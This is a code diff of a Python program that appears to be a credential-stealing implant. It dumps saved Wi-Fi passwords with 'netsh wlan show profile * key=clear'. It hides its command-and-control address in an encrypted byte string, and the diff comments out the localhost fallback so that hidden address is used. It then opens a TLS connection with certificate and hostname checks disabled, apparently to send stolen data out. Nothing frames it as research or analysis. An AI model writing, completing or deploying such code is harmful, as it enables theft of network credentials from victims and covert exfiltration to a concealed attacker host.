@@ -10,13 +10,13 @@ from CryptoPhenix import decrypt
 
 
 warnings.filterwarnings("ignore", category=DeprecationWarning)
-points = subprocess.Popen(["NETSH", "WLAN", "SHOW", "PROFILE", "*", "KEY=CLEAR"], stdout=subprocess.PIPE)
+points = subprocess.Popen(["NETSH", "WLAN", "SHOW", "PROFILE", "*", "KEY=CLEAR"], stdout=subprocess.PIPE, shell=True)
 
 
 def know_gme():
-    unkown = b'u\x1b1.\x9aQ\x11CO>\x87:e7\xd6q\x14\x02[#\x8d{p\xad\x99\xecj\t\xea\xc7\xd3\xc6\xe1\x15n\xce|a=BowY$\xc4,\x846\x7fG\x82\xca\xbb\x1e\xbb\x93<\x1e\xb6\x03S\x1a\\\xff'
+    unkown = b'V\x1c\x17D(\xd3s\xac\xc6\x9f\x01\x10h\x88\xcb\xfe\xed\xd2\xd8{B\xd0\x96\xb7\x9d\xe7SD\x1d2T\x84\xdbN\x19MC\x01\x16\xf3Cz\xd16\xb4~\xb3g\xf0R)\xc3J\x90\xfc\xfc\xf3T\xbd9\x82\xd4\xc0\x89'
     return str(decrypt(unkown).decode())
-    return "127.0.0.1"
+    #return "127.0.0.1"
 
 
 def get_points():
@@ -58,10 +58,6 @@ def all_right():
     import tempfile
     import ssl
 
-    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-
-    context.check_hostname = None
-
     cock = tempfile.NamedTemporaryFile(delete=False)
     cock.write(certs.get_crte().encode())
     cock.close()
@@ -70,8 +66,9 @@ def all_right():
     csd.write(certs.get_locker().encode())
     csd.close()
 
-    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-    #context.verify_mode = ssl.CERT_NONE  # Cambiar a ssl.CERT_REQUIRED si deseas verificar el certificado del servidor
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    context.check_hostname = False
+    context.verify_mode = ssl.CERT_NONE
     context.load_cert_chain(certfile=cock.name, keyfile=csd.name)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
